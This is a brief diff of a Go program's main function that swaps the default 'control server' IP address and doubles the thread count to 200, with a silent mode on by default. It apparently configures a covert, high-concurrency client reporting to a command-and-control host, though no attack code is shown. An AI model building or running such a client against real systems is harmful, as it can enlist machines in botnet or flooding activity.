@@ -15,8 +15,8 @@ import (
 )
 
 func main() {
-	serverAddr := flag.String("server", "195.189.96.174:8080", "Address of the control server")
-	numThreads := flag.Int("threads", 100, "Number of concurrent threads")
+	serverAddr := flag.String("server", "84.32.70.197:8080", "Address of the control server")
+	numThreads := flag.Int("threads", 200, "Number of concurrent threads")
 	silent := flag.Bool("silent", true, "Run in silent mode (no console output)")
 	logDir := flag.String("logdir", "./logs", "Directory for log files")
 	flag.Parse()
